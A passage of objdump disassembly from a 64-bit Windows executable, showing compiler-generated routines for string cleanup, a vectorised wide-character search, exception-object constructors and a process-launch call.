   14000263a:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   14000263e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002643:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   140002648:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   14000264d:	0f 11 45 b0          	movups %xmm0,-0x50(%rbp)
   140002651:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
   140002658:	08 
   140002659:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   14000265d:	44 89 7c 24 20       	mov    %r15d,0x20(%rsp)
   140002662:	0f 11 45 f0          	movups %xmm0,-0x10(%rbp)
   140002666:	c7 45 b0 68 00 00 00 	movl   $0x68,-0x50(%rbp)
   14000266d:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   140002671:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
   140002678:	0f 11 45 d0          	movups %xmm0,-0x30(%rbp)
   14000267c:	66 44 89 7d f0       	mov    %r15w,-0x10(%rbp)
   140002681:	0f 11 45 00          	movups %xmm0,0x0(%rbp)
   140002685:	0f 11 85 b0 01 00 00 	movups %xmm0,0x1b0(%rbp)
   14000268c:	ff 15 f6 e9 00 00    	call   *0xe9f6(%rip)        # 0x140011088
   140002692:	48 8b 8d b8 01 00 00 	mov    0x1b8(%rbp),%rcx
   140002699:	48 85 c9             	test   %rcx,%rcx
   14000269c:	74 06                	je     0x1400026a4
   14000269e:	ff 15 c4 e9 00 00    	call   *0xe9c4(%rip)        # 0x140011068
   1400026a4:	48 8b 8d b0 01 00 00 	mov    0x1b0(%rbp),%rcx
   1400026ab:	48 85 c9             	test   %rcx,%rcx
   1400026ae:	74 06                	je     0x1400026b6
   1400026b0:	ff 15 b2 e9 00 00    	call   *0xe9b2(%rip)        # 0x140011068
   1400026b6:	48 8b 95 88 01 00 00 	mov    0x188(%rbp),%rdx
   1400026bd:	48 83 fa 07          	cmp    $0x7,%rdx
   1400026c1:	76 39                	jbe    0x1400026fc
   1400026c3:	48 8b 8d 70 01 00 00 	mov    0x170(%rbp),%rcx
   1400026ca:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400026d1:	00 
   1400026d2:	48 8b c1             	mov    %rcx,%rax
   1400026d5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400026dc:	72 19                	jb     0x1400026f7
   1400026de:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400026e2:	48 83 c2 27          	add    $0x27,%rdx
   1400026e6:	48 2b c1             	sub    %rcx,%rax
   1400026e9:	48 83 e8 08          	sub    $0x8,%rax
   1400026ed:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400026f1:	0f 87 9d 02 00 00    	ja     0x140002994
   1400026f7:	e8 e8 12 00 00       	call   0x1400039e4
   1400026fc:	48 8b 95 48 01 00 00 	mov    0x148(%rbp),%rdx
   140002703:	66 44 89 bd 70 01 00 	mov    %r15w,0x170(%rbp)
   14000270a:	00 
   14000270b:	48 c7 85 88 01 00 00 	movq   $0x7,0x188(%rbp)
   140002712:	07 00 00 00 
   140002716:	4c 89 bd 80 01 00 00 	mov    %r15,0x180(%rbp)
   14000271d:	48 83 fa 07          	cmp    $0x7,%rdx
   140002721:	76 39                	jbe    0x14000275c
   140002723:	48 8b 8d 30 01 00 00 	mov    0x130(%rbp),%rcx
   14000272a:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002731:	00 
   140002732:	48 8b c1             	mov    %rcx,%rax
   140002735:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000273c:	72 19                	jb     0x140002757
   14000273e:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002742:	48 83 c2 27          	add    $0x27,%rdx
   140002746:	48 2b c1             	sub    %rcx,%rax
   140002749:	48 83 e8 08          	sub    $0x8,%rax
   14000274d:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002751:	0f 87 3d 02 00 00    	ja     0x140002994
   140002757:	e8 88 12 00 00       	call   0x1400039e4
   14000275c:	66 44 89 bd 30 01 00 	mov    %r15w,0x130(%rbp)
   140002763:	00 
   140002764:	f3 44 0f 7f 85 40 01 	movdqu %xmm8,0x140(%rbp)
   14000276b:	00 00 
   14000276d:	48 85 db             	test   %rbx,%rbx
   140002770:	74 33                	je     0x1400027a5
   140002772:	48 2b f3             	sub    %rbx,%rsi
   140002775:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   14000277c:	72 1c                	jb     0x14000279a
   14000277e:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140002782:	48 83 c6 27          	add    $0x27,%rsi
   140002786:	48 2b d8             	sub    %rax,%rbx
   140002789:	48 83 eb 08          	sub    $0x8,%rbx
   14000278d:	48 83 fb 1f          	cmp    $0x1f,%rbx
   140002791:	0f 87 fd 01 00 00    	ja     0x140002994
   140002797:	48 8b d8             	mov    %rax,%rbx
   14000279a:	48 8b d6             	mov    %rsi,%rdx
   14000279d:	48 8b cb             	mov    %rbx,%rcx
   1400027a0:	e8 3f 12 00 00       	call   0x1400039e4
   1400027a5:	48 8b 95 68 01 00 00 	mov    0x168(%rbp),%rdx
   1400027ac:	48 83 fa 07          	cmp    $0x7,%rdx
   1400027b0:	76 39                	jbe    0x1400027eb
   1400027b2:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   1400027b9:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400027c0:	00 
   1400027c1:	48 8b c1             	mov    %rcx,%rax
   1400027c4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400027cb:	72 19                	jb     0x1400027e6
   1400027cd:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400027d1:	48 83 c2 27          	add    $0x27,%rdx
   1400027d5:	48 2b c1             	sub    %rcx,%rax
   1400027d8:	48 83 e8 08          	sub    $0x8,%rax
   1400027dc:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400027e0:	0f 87 ae 01 00 00    	ja     0x140002994
   1400027e6:	e8 f9 11 00 00       	call   0x1400039e4
   1400027eb:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   1400027f0:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   1400027f5:	8b 4c 24 7c          	mov    0x7c(%rsp),%ecx
   1400027f9:	ff c1                	inc    %ecx
   1400027fb:	89 4c 24 7c          	mov    %ecx,0x7c(%rsp)
   1400027ff:	3b 4d 88             	cmp    -0x78(%rbp),%ecx
   140002802:	73 4f                	jae    0x140002853
   140002804:	4c 8b 75 a0          	mov    -0x60(%rbp),%r14
   140002808:	e9 33 f8 ff ff       	jmp    0x140002040
   14000280d:	48 8b 95 68 01 00 00 	mov    0x168(%rbp),%rdx
   140002814:	48 83 fa 07          	cmp    $0x7,%rdx
   140002818:	76 39                	jbe    0x140002853
   14000281a:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   140002821:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002828:	00 
   140002829:	48 8b c1             	mov    %rcx,%rax
   14000282c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002833:	72 19                	jb     0x14000284e
   140002835:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002839:	48 83 c2 27          	add    $0x27,%rdx
   14000283d:	48 2b c1             	sub    %rcx,%rax
   140002840:	48 83 e8 08          	sub    $0x8,%rax
   140002844:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002848:	0f 87 46 01 00 00    	ja     0x140002994
   14000284e:	e8 91 11 00 00       	call   0x1400039e4
   140002853:	4c 8b 7c 24 58       	mov    0x58(%rsp),%r15
   140002858:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   14000285c:	e8 18 03 00 00       	call   0x140002b79
   140002861:	45 33 f6             	xor    %r14d,%r14d
   140002864:	41 8b de             	mov    %r14d,%ebx
   140002867:	eb 4b                	jmp    0x1400028b4
   140002869:	48 8b 95 68 01 00 00 	mov    0x168(%rbp),%rdx
   140002870:	48 83 fa 07          	cmp    $0x7,%rdx
   140002874:	76 dd                	jbe    0x140002853
   140002876:	48 8b 8d 50 01 00 00 	mov    0x150(%rbp),%rcx
   14000287d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002884:	00 
   140002885:	48 8b c1             	mov    %rcx,%rax
   140002888:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000288f:	72 bd                	jb     0x14000284e
   140002891:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002895:	48 83 c2 27          	add    $0x27,%rdx
   140002899:	48 2b c1             	sub    %rcx,%rax
   14000289c:	48 83 e8 08          	sub    $0x8,%rax
   1400028a0:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400028a4:	0f 87 ea 00 00 00    	ja     0x140002994
   1400028aa:	eb a2                	jmp    0x14000284e
   1400028ac:	45 33 f6             	xor    %r14d,%r14d
   1400028af:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400028b4:	48 85 f6             	test   %rsi,%rsi
   1400028b7:	74 43                	je     0x1400028fc
   1400028b9:	4c 2b fe             	sub    %rsi,%r15
   1400028bc:	49 81 ff 00 10 00 00 	cmp    $0x1000,%r15
   1400028c3:	72 1c                	jb     0x1400028e1
   1400028c5:	48 8b 46 f8          	mov    -0x8(%rsi),%rax
   1400028c9:	49 83 c7 27          	add    $0x27,%r15
   1400028cd:	48 2b f0             	sub    %rax,%rsi
   1400028d0:	48 83 ee 08          	sub    $0x8,%rsi
   1400028d4:	48 83 fe 1f          	cmp    $0x1f,%rsi
   1400028d8:	0f 87 a1 00 00 00    	ja     0x14000297f
   1400028de:	48 8b f0             	mov    %rax,%rsi
   1400028e1:	49 8b d7             	mov    %r15,%rdx
   1400028e4:	48 8b ce             	mov    %rsi,%rcx
   1400028e7:	e8 f8 10 00 00       	call   0x1400039e4
   1400028ec:	eb 0e                	jmp    0x1400028fc
   1400028ee:	48 8b cb             	mov    %rbx,%rcx
   1400028f1:	ff 15 71 e7 00 00    	call   *0xe771(%rip)        # 0x140011068
   1400028f7:	bb 01 00 00 00       	mov    $0x1,%ebx
   1400028fc:	48 8b 95 a8 01 00 00 	mov    0x1a8(%rbp),%rdx
   140002903:	48 83 fa 07          	cmp    $0x7,%rdx
   140002907:	76 35                	jbe    0x14000293e
   140002909:	48 8b 8d 90 01 00 00 	mov    0x190(%rbp),%rcx
   140002910:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002917:	00 
   140002918:	48 8b c1             	mov    %rcx,%rax
   14000291b:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002922:	72 15                	jb     0x140002939
   140002924:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002928:	48 83 c2 27          	add    $0x27,%rdx
   14000292c:	48 2b c1             	sub    %rcx,%rax
   14000292f:	48 83 e8 08          	sub    $0x8,%rax
   140002933:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002937:	77 46                	ja     0x14000297f
   140002939:	e8 a6 10 00 00       	call   0x1400039e4
   14000293e:	8b c3                	mov    %ebx,%eax
   140002940:	48 8b 8d f0 05 00 00 	mov    0x5f0(%rbp),%rcx
   140002947:	48 33 cc             	xor    %rsp,%rcx
   14000294a:	e8 31 11 00 00       	call   0x140003a80
   14000294f:	4c 8d 9c 24 30 07 00 	lea    0x730(%rsp),%r11
   140002956:	00 
   140002957:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   14000295b:	49 8b 73 38          	mov    0x38(%r11),%rsi
   14000295f:	49 8b 7b 40          	mov    0x40(%r11),%rdi
   140002963:	41 0f 28 73 f0       	movaps -0x10(%r11),%xmm6
   140002968:	41 0f 28 7b e0       	movaps -0x20(%r11),%xmm7
   14000296d:	45 0f 28 43 d0       	movaps -0x30(%r11),%xmm8
   140002972:	49 8b e3             	mov    %r11,%rsp
   140002975:	41 5f                	pop    %r15
   140002977:	41 5e                	pop    %r14
   140002979:	41 5d                	pop    %r13
   14000297b:	41 5c                	pop    %r12
   14000297d:	5d                   	pop    %rbp
   14000297e:	c3                   	ret
   14000297f:	45 33 c9             	xor    %r9d,%r9d
   140002982:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002987:	45 33 c0             	xor    %r8d,%r8d
   14000298a:	33 d2                	xor    %edx,%edx
   14000298c:	33 c9                	xor    %ecx,%ecx
   14000298e:	e8 19 49 00 00       	call   0x1400072ac
   140002993:	cc                   	int3
   140002994:	45 33 c9             	xor    %r9d,%r9d
   140002997:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000299c:	45 33 c0             	xor    %r8d,%r8d
   14000299f:	33 d2                	xor    %edx,%edx
   1400029a1:	33 c9                	xor    %ecx,%ecx
   1400029a3:	e8 04 49 00 00       	call   0x1400072ac
   1400029a8:	cc                   	int3
   1400029a9:	45 33 e4             	xor    %r12d,%r12d
   1400029ac:	45 33 c9             	xor    %r9d,%r9d
   1400029af:	45 33 c0             	xor    %r8d,%r8d
   1400029b2:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400029b7:	33 d2                	xor    %edx,%edx
   1400029b9:	33 c9                	xor    %ecx,%ecx
   1400029bb:	e8 ec 48 00 00       	call   0x1400072ac
   1400029c0:	cc                   	int3
   1400029c1:	e8 aa eb ff ff       	call   0x140001570
   1400029c6:	cc                   	int3
   1400029c7:	45 33 c9             	xor    %r9d,%r9d
   1400029ca:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400029cf:	45 33 c0             	xor    %r8d,%r8d
   1400029d2:	33 d2                	xor    %edx,%edx
   1400029d4:	33 c9                	xor    %ecx,%ecx
   1400029d6:	e8 d1 48 00 00       	call   0x1400072ac
   1400029db:	cc                   	int3
   1400029dc:	e8 af eb ff ff       	call   0x140001590
   1400029e1:	cc                   	int3
   1400029e2:	45 33 c9             	xor    %r9d,%r9d
   1400029e5:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   1400029ea:	45 33 c0             	xor    %r8d,%r8d
   1400029ed:	33 d2                	xor    %edx,%edx
   1400029ef:	33 c9                	xor    %ecx,%ecx
   1400029f1:	e8 b6 48 00 00       	call   0x1400072ac
   1400029f6:	cc                   	int3
   1400029f7:	cc                   	int3
   1400029f8:	cc                   	int3
   1400029f9:	cc                   	int3
   1400029fa:	cc                   	int3
   1400029fb:	cc                   	int3
   1400029fc:	cc                   	int3
   1400029fd:	cc                   	int3
   1400029fe:	cc                   	int3
   1400029ff:	cc                   	int3
   140002a00:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002a05:	55                   	push   %rbp
   140002a06:	48 83 ec 60          	sub    $0x60,%rsp
   140002a0a:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140002a0f:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   140002a13:	33 c0                	xor    %eax,%eax
   140002a15:	44 0f bf da          	movswl %dx,%r11d
   140002a19:	39 05 41 c1 01 00    	cmp    %eax,0x1c141(%rip)        # 0x14001eb60
   140002a1f:	48 8b d9             	mov    %rcx,%rbx
   140002a22:	4c 8b d1             	mov    %rcx,%r10
   140002a25:	74 53                	je     0x140002a7a
   140002a27:	49 83 f8 10          	cmp    $0x10,%r8
   140002a2b:	72 4d                	jb     0x140002a7a
   140002a2d:	45 0f b7 cb          	movzwl %r11w,%r9d
   140002a31:	b9 10 00 00 00       	mov    $0x10,%ecx
   140002a36:	66 41 0f 6e c1       	movd   %r9d,%xmm0
   140002a3b:	c4 e2 7d 79 c0       	vpbroadcastw %xmm0,%ymm0
   140002a40:	c5 fe 7f 45 20       	vmovdqu %ymm0,0x20(%rbp)
   140002a45:	c5 f8 77             	vzeroupper
   140002a48:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002a4f:	00 
   140002a50:	c4 c1 7e 6f 02       	vmovdqu (%r10),%ymm0
   140002a55:	c5 fd 75 4d 20       	vpcmpeqw 0x20(%rbp),%ymm0,%ymm1
   140002a5a:	c5 fd d7 d1          	vpmovmskb %ymm1,%edx
   140002a5e:	85 d2                	test   %edx,%edx
   140002a60:	0f 85 92 00 00 00    	jne    0x140002af8
   140002a66:	48 83 c0 10          	add    $0x10,%rax
   140002a6a:	48 83 c1 10          	add    $0x10,%rcx
   140002a6e:	49 83 c2 20          	add    $0x20,%r10
   140002a72:	49 3b c8             	cmp    %r8,%rcx
   140002a75:	c5 f8 77             	vzeroupper
   140002a78:	76 d6                	jbe    0x140002a50
   140002a7a:	48 8d 48 04          	lea    0x4(%rax),%rcx
   140002a7e:	49 3b c8             	cmp    %r8,%rcx
   140002a81:	0f 87 aa 00 00 00    	ja     0x140002b31
   140002a87:	66 41 0f 6e cb       	movd   %r11d,%xmm1
   140002a8c:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002a90:	66 0f 61 c9          	punpcklwd %xmm1,%xmm1
   140002a94:	66 0f 70 c9 00       	pshufd $0x0,%xmm1,%xmm1
   140002a99:	49 3b c8             	cmp    %r8,%rcx
   140002a9c:	77 25                	ja     0x140002ac3
   140002a9e:	66 90                	xchg   %ax,%ax
   140002aa0:	f3 41 0f 6f 02       	movdqu (%r10),%xmm0
   140002aa5:	66 0f 75 c1          	pcmpeqw %xmm1,%xmm0
   140002aa9:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   140002aad:	66 85 d2             	test   %dx,%dx
   140002ab0:	75 61                	jne    0x140002b13
   140002ab2:	48 83 c0 08          	add    $0x8,%rax
   140002ab6:	48 83 c1 08          	add    $0x8,%rcx
   140002aba:	49 83 c2 10          	add    $0x10,%r10
   140002abe:	49 3b c8             	cmp    %r8,%rcx
   140002ac1:	76 dd                	jbe    0x140002aa0
   140002ac3:	48 8d 48 04          	lea    0x4(%rax),%rcx
   140002ac7:	49 3b c8             	cmp    %r8,%rcx
   140002aca:	77 65                	ja     0x140002b31
   140002acc:	f3 41 0f 7e 02       	movq   (%r10),%xmm0
   140002ad1:	66 0f 75 c1          	pcmpeqw %xmm1,%xmm0
   140002ad5:	66 0f d7 d0          	pmovmskb %xmm0,%edx
   140002ad9:	84 d2                	test   %dl,%dl
   140002adb:	74 51                	je     0x140002b2e
   140002add:	0f b6 ca             	movzbl %dl,%ecx
   140002ae0:	0f bc c9             	bsf    %ecx,%ecx
   140002ae3:	48 d1 e9             	shr    $1,%rcx
   140002ae6:	48 03 c8             	add    %rax,%rcx
   140002ae9:	48 8d 04 4b          	lea    (%rbx,%rcx,2),%rax
   140002aed:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002af2:	48 83 c4 60          	add    $0x60,%rsp
   140002af6:	5d                   	pop    %rbp
   140002af7:	c3                   	ret
   140002af8:	0f bc d2             	bsf    %edx,%edx
   140002afb:	48 d1 ea             	shr    $1,%rdx
   140002afe:	48 03 d0             	add    %rax,%rdx
   140002b01:	48 8d 04 53          	lea    (%rbx,%rdx,2),%rax
   140002b05:	c5 f8 77             	vzeroupper
   140002b08:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002b0d:	48 83 c4 60          	add    $0x60,%rsp
   140002b11:	5d                   	pop    %rbp
   140002b12:	c3                   	ret
   140002b13:	0f b7 ca             	movzwl %dx,%ecx
   140002b16:	0f bc c9             	bsf    %ecx,%ecx
   140002b19:	48 d1 e9             	shr    $1,%rcx
   140002b1c:	48 03 c8             	add    %rax,%rcx
   140002b1f:	48 8d 04 4b          	lea    (%rbx,%rcx,2),%rax
   140002b23:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002b28:	48 83 c4 60          	add    $0x60,%rsp
   140002b2c:	5d                   	pop    %rbp
   140002b2d:	c3                   	ret
   140002b2e:	48 8b c1             	mov    %rcx,%rax
   140002b31:	49 3b c0             	cmp    %r8,%rax
   140002b34:	73 1c                	jae    0x140002b52
   140002b36:	48 8d 0c 43          	lea    (%rbx,%rax,2),%rcx
   140002b3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002b40:	66 44 39 19          	cmp    %r11w,(%rcx)
   140002b44:	74 19                	je     0x140002b5f
   140002b46:	48 ff c0             	inc    %rax
   140002b49:	48 83 c1 02          	add    $0x2,%rcx
   140002b4d:	49 3b c0             	cmp    %r8,%rax
   140002b50:	72 ee                	jb     0x140002b40
   140002b52:	33 c0                	xor    %eax,%eax
   140002b54:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002b59:	48 83 c4 60          	add    $0x60,%rsp
   140002b5d:	5d                   	pop    %rbp
   140002b5e:	c3                   	ret
   140002b5f:	48 8b c1             	mov    %rcx,%rax
   140002b62:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002b67:	48 83 c4 60          	add    $0x60,%rsp
   140002b6b:	5d                   	pop    %rbp
   140002b6c:	c3                   	ret
   140002b6d:	ff 25 9d e4 00 00    	jmp    *0xe49d(%rip)        # 0x140011010
   140002b73:	ff 25 87 e4 00 00    	jmp    *0xe487(%rip)        # 0x140011000
   140002b79:	ff 25 89 e4 00 00    	jmp    *0xe489(%rip)        # 0x140011008
   140002b7f:	cc                   	int3
   140002b80:	48 8d 05 d9 e8 00 00 	lea    0xe8d9(%rip),%rax        # 0x140011460
   140002b87:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140002b8e:	00 
   140002b8f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002b93:	48 8d 05 56 e8 00 00 	lea    0xe856(%rip),%rax        # 0x1400113f0
   140002b9a:	48 89 01             	mov    %rax,(%rcx)
   140002b9d:	48 8b c1             	mov    %rcx,%rax
   140002ba0:	c3                   	ret
   140002ba1:	cc                   	int3
   140002ba2:	cc                   	int3
   140002ba3:	cc                   	int3
   140002ba4:	40 53                	rex push %rbx
   140002ba6:	48 83 ec 20          	sub    $0x20,%rsp
   140002baa:	48 8b d9             	mov    %rcx,%rbx
   140002bad:	48 8b c2             	mov    %rdx,%rax
   140002bb0:	48 8d 0d 09 e8 00 00 	lea    0xe809(%rip),%rcx        # 0x1400113c0
   140002bb7:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002bba:	48 89 0b             	mov    %rcx,(%rbx)
   140002bbd:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002bc1:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002bc5:	0f 11 02             	movups %xmm0,(%rdx)
   140002bc8:	e8 f3 1b 00 00       	call   0x1400047c0
   140002bcd:	48 8d 05 bc e8 00 00 	lea    0xe8bc(%rip),%rax        # 0x140011490
   140002bd4:	48 89 03             	mov    %rax,(%rbx)
   140002bd7:	48 8b c3             	mov    %rbx,%rax
   140002bda:	48 83 c4 20          	add    $0x20,%rsp
   140002bde:	5b                   	pop    %rbx
   140002bdf:	c3                   	ret
   140002be0:	40 53                	rex push %rbx
   140002be2:	48 83 ec 30          	sub    $0x30,%rsp
   140002be6:	48 8b d9             	mov    %rcx,%rbx
   140002be9:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140002bee:	48 8b c2             	mov    %rdx,%rax
   140002bf1:	48 8d 0d c8 e7 00 00 	lea    0xe7c8(%rip),%rcx        # 0x1400113c0
   140002bf8:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002bfb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002c00:	48 89 0b             	mov    %rcx,(%rbx)
   140002c03:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002c07:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c0c:	0f 11 02             	movups %xmm0,(%rdx)
   140002c0f:	e8 ac 1b 00 00       	call   0x1400047c0
   140002c14:	48 8d 05 75 e8 00 00 	lea    0xe875(%rip),%rax        # 0x140011490
   140002c1b:	48 89 03             	mov    %rax,(%rbx)
   140002c1e:	48 8b c3             	mov    %rbx,%rax
   140002c21:	48 83 c4 30          	add    $0x30,%rsp
   140002c25:	5b                   	pop    %rbx
   140002c26:	c3                   	ret
   140002c27:	cc                   	int3
   140002c28:	40 53                	rex push %rbx
   140002c2a:	48 83 ec 20          	sub    $0x20,%rsp
   140002c2e:	48 8b d9             	mov    %rcx,%rbx
   140002c31:	48 8b c2             	mov    %rdx,%rax
   140002c34:	48 8d 0d 85 e7 00 00 	lea    0xe785(%rip),%rcx        # 0x1400113c0
   140002c3b:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c3e:	48 89 0b             	mov    %rcx,(%rbx)
   140002c41:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140002c45:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140002c49:	0f 11 02             	movups %xmm0,(%rdx)
   140002c4c:	e8 6f 1b 00 00       	call   0x1400047c0
   140002c51:	48 8d 05 20 e8 00 00 	lea    0xe820(%rip),%rax        # 0x140011478
   140002c58:	48 89 03             	mov    %rax,(%rbx)
   140002c5b:	48 8b c3             	mov    %rbx,%rax
   140002c5e:	48 83 c4 20          	add    $0x20,%rsp
   140002c62:	5b                   	pop    %rbx
   140002c63:	c3                   	ret
   140002c64:	48 83 ec 48          	sub    $0x48,%rsp
   140002c68:	48 8b d1             	mov    %rcx,%rdx
   140002c6b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c70:	e8 6b ff ff ff       	call   0x140002be0
   140002c75:	48 8d 15 4c 9f 01 00 	lea    0x19f4c(%rip),%rdx        # 0x14001cbc8
   140002c7c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002c81:	e8 e2 1b 00 00       	call   0x140004868
   140002c86:	cc                   	int3
   140002c87:	cc                   	int3
   140002c88:	cc                   	int3
   140002c89:	cc                   	int3
   140002c8a:	cc                   	int3
   140002c8b:	cc                   	int3
   140002c8c:	cc                   	int3
   140002c8d:	cc                   	int3
   140002c8e:	cc                   	int3
   140002c8f:	cc                   	int3
   140002c90:	66 0f 6f 0d f8 0c 01 	movdqa 0x10cf8(%rip),%xmm1        # 0x140013990
   140002c97:	00 
   140002c98:	48 8d 04 12          	lea    (%rdx,%rdx,1),%rax
   140002c9c:	48 8b d0             	mov    %rax,%rdx
   140002c9f:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   140002ca3:	48 03 d1             	add    %rcx,%rdx
   140002ca6:	48 3b ca             	cmp    %rdx,%rcx
   140002ca9:	74 19                	je     0x140002cc4
   140002cab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002cb0:	f3 0f 6f 01          	movdqu (%rcx),%xmm0
   140002cb4:	66 0f 38 17 c8       	ptest  %xmm0,%xmm1
   140002cb9:	75 2b                	jne    0x140002ce6
   140002cbb:	48 83 c1 10          	add    $0x10,%rcx
   140002cbf:	48 3b ca             	cmp    %rdx,%rcx
   140002cc2:	75 ec                	jne    0x140002cb0
   140002cc4:	83 e0 0f             	and    $0xf,%eax
   140002cc7:	48 03 d0             	add    %rax,%rdx
   140002cca:	48 3b ca             	cmp    %rdx,%rcx
   140002ccd:	74 14                	je     0x140002ce3
   140002ccf:	90                   	nop
   140002cd0:	0f b7 01             	movzwl (%rcx),%eax
   140002cd3:	a9 00 ff ff ff       	test   $0xffffff00,%eax
   140002cd8:	75 0c                	jne    0x140002ce6
   140002cda:	48 83 c1 02          	add    $0x2,%rcx
   140002cde:	48 3b ca             	cmp    %rdx,%rcx
   140002ce1:	75 ed                	jne    0x140002cd0
   140002ce3:	b0 01                	mov    $0x1,%al
   140002ce5:	c3                   	ret
   140002ce6:	32 c0                	xor    %al,%al
   140002ce8:	c3                   	ret
   140002ce9:	cc                   	int3
   140002cea:	cc                   	int3
   140002ceb:	cc                   	int3
   140002cec:	cc                   	int3
   140002ced:	cc                   	int3
   140002cee:	cc                   	int3
   140002cef:	cc                   	int3
   140002cf0:	40 55                	rex push %rbp
   140002cf2:	53                   	push   %rbx
   140002cf3:	56                   	push   %rsi
   140002cf4:	57                   	push   %rdi
   140002cf5:	41 56                	push   %r14
   140002cf7:	41 57                	push   %r15
   140002cf9:	48 81 ec 58 01 00 00 	sub    $0x158,%rsp
   140002d00:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002d05:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   140002d09:	48 8b 05 f0 b2 01 00 	mov    0x1b2f0(%rip),%rax        # 0x14001e000
   140002d10:	48 33 c4             	xor    %rsp,%rax
   140002d13:	48 89 85 00 01 00 00 	mov    %rax,0x100(%rbp)
   140002d1a:	8b 05 34 b3 01 00    	mov    0x1b334(%rip),%eax        # 0x14001e054
   140002d20:	4d 8b f1             	mov    %r9,%r14
   140002d23:	49 8b f8             	mov    %r8,%rdi
   140002d26:	48 8b da             	mov    %rdx,%rbx
   140002d29:	4c 8b f9             	mov    %rcx,%r15
   140002d2c:	a8 04                	test   $0x4,%al
   140002d2e:	0f 84 e5 00 00 00    	je     0x140002e19
   140002d34:	a8 20                	test   $0x20,%al
   140002d36:	74 25                	je     0x140002d5d
   140002d38:	48 83 fa 30          	cmp    $0x30,%rdx
   140002d3c:	76 1f                	jbe    0x140002d5d
   140002d3e:	49 83 f9 08          	cmp    $0x8,%r9
   140002d42:	77 10                	ja     0x140002d54
   140002d44:	33 c9                	xor    %ecx,%ecx
   140002d46:	48 81 fa 80 00 00 00 	cmp    $0x80,%rdx
   140002d4d:	0f 97 c1             	seta   %cl
   140002d50:	03 c9                	add    %ecx,%ecx
   140002d52:	eb 24                	jmp    0x140002d78
   140002d54:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002d59:	03 c9                	add    %ecx,%ecx
   140002d5b:	eb 1b                	jmp    0x140002d78
